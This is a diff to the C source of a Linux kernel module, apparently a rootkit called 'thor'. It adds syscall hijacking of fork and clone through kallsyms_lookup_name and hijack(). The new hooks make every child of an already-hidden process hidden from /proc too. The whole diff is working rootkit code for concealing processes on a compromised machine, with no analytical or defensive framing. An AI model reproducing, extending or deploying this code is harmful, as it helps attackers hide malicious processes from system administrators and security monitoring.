@@ -2,9 +2,12 @@
 
 #include "config.h"
 #include "helper.h"
+#include "hijack.h"
+#include "logging.h"
 #include "procfile.h"
 
 #include <linux/fs.h>
+#include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/version.h>
 
@@ -18,7 +21,31 @@ static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
 #endif
 static int thor_proc_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type);
-
+static long thor_fork(void);
+#ifdef __ARCH_WANT_SYS_CLONE
+# ifdef CONFIG_CLONE_BACKWARDS
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int tls_val,
+                int __user * child_tidptr);
+# elif defined(CONFIG_CLONE_BACKWARDS2)
+long thor_clone(unsigned long newsp, unsigned long clone_flags,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# elif defined(CONFIG_CLONE_BACKWARDS3)
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int stack_size,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# else
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# endif
+#endif
 /* node for hiding list */
 struct _pid_list {
     char *name;
@@ -33,6 +60,33 @@ static struct proc_dir_entry *procroot;
 
 /* file operations of /proc */
 static struct file_operations *proc_fops;
+
+/* pointers to syscalls we need to hook/hijack */
+static long (*sys_fork)(void);
+#ifdef __ARCH_WANT_SYS_CLONE
+# ifdef CONFIG_CLONE_BACKWARDS
+static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int tls_val,
+                int __user * child_tidptr);
+# elif defined(CONFIG_CLONE_BACKWARDS2)
+static long (*sys_clone)(unsigned long newsp, unsigned long clone_flags,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# elif defined(CONFIG_CLONE_BACKWARDS3)
+static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
+                int stack_size,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# else
+static long (*sys_clone)(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val);
+# endif
+#endif
 
 /* pointer to original proc_iterate function */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
@@ -65,6 +119,25 @@ int prochider_init(void)
     write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
 
+    sys_fork = (void*) kallsyms_lookup_name("sys_fork");
+
+    if (sys_fork == NULL) {
+        LOG_ERROR("failed to lookup syscall fork");
+        return -1;
+    }
+
+    sys_clone = (void*) kallsyms_lookup_name("sys_clone");
+
+    if (sys_clone == NULL) {
+        LOG_ERROR("failed to lookup syscall clone");
+        return -1;
+    }
+
+    hijack(sys_fork, thor_fork);
+#ifdef __ARCH_WANT_SYS_CLONE
+    hijack(sys_clone, thor_clone);
+#endif
+
     INIT_LIST_HEAD(&pid_list.list);
 
     return 0;
@@ -82,7 +155,119 @@ void prochider_cleanup(void)
     }
 
     clear_pid_list();
+
+    unhijack(sys_fork);
+#ifdef __ARCH_WANT_SYS_CLONE
+    unhijack(sys_clone);
+#endif
 }
+
+static long thor_fork(void)
+{
+    struct _pid_list *tmp;
+    bool hidden = false;
+    long ret;
+
+    /* check if process calling fork is hidden */
+    list_for_each_entry(tmp, &(pid_list.list), list) {
+        int pid;
+        kstrtoint(tmp->name, 10, &pid);
+        if (pid == current->pid) {
+            LOG_DEBUG("(thor_fork) mother process hidden");
+            hidden = true;
+        }
+    }
+
+    unhijack(sys_fork);
+    ret = sys_fork();
+    hijack(sys_fork, thor_fork);
+
+    /* if mother process was hidden child process */
+    if(hidden && ret != -1 && ret != 0) {
+        char pidname[6];
+        LOG_DEBUG("(thor_fork) hiding child process: %hu", (unsigned short)ret);
+        snprintf(pidname, 6, "%hu", (unsigned short)ret);
+        add_to_pid_list(pidname, strlen(pidname)+1);
+    }
+
+    return ret;
+}
+
+#ifdef __ARCH_WANT_SYS_CLONE
+# ifdef CONFIG_CLONE_BACKWARDS
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int tls_val,
+                int __user * child_tidptr)
+# elif defined(CONFIG_CLONE_BACKWARDS2)
+long thor_clone(unsigned long newsp, unsigned long clone_flags,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val)
+# elif defined(CONFIG_CLONE_BACKWARDS3)
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int stack_size,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val)
+# else
+long thor_clone(unsigned long clone_flags, unsigned long newsp,
+                int __user * parent_tidptr,
+                int __user * child_tidptr,
+                int tls_val)
+# endif
+{
+    struct _pid_list *tmp;
+    bool hidden = false;
+    long ret;
+
+    /* check if process calling clone is hidden */
+    list_for_each_entry(tmp, &(pid_list.list), list) {
+        int pid;
+        kstrtoint(tmp->name, 10, &pid);
+        if (pid == current->pid) {
+            LOG_DEBUG("(thor_clone) mother process hidden");
+            hidden = true;
+        }
+    }
+
+    unhijack(sys_clone);
+# ifdef CONFIG_CLONE_BACKWARDS
+    ret = sys_clone(clone_flags, newsp,
+                parent_tidptr,
+                tls_val,
+                child_tidptr);
+# elif defined(CONFIG_CLONE_BACKWARDS2)
+    ret = sys_clone(newsp, clone_flags,
+                parent_tidptr,
+                child_tidptr,
+                tls_val);
+# elif defined(CONFIG_CLONE_BACKWARDS3)
+    ret = sys_clone(clone_flags, newsp,
+                stack_size,
+                parent_tidptr,
+                child_tidptr,
+                tls_val);
+# else
+    ret = sys_clone(clone_flags, newsp,
+                parent_tidptr,
+                child_tidptr,
+                tls_val);
+# endif
+    hijack(sys_clone, thor_clone);
+
+    /* if mother process was hidden child process */
+    if(hidden && ret != -1 && ret != 0) {
+        char pidname[6];
+        LOG_DEBUG("(thor_clone) hiding child process: %hu", (unsigned short)ret);
+        snprintf(pidname, 6, "%hu", (unsigned short)ret);
+        add_to_pid_list(pidname, strlen(pidname)+1);
+    }
+
+    return ret;
+}
+#endif
+
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
 static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir)
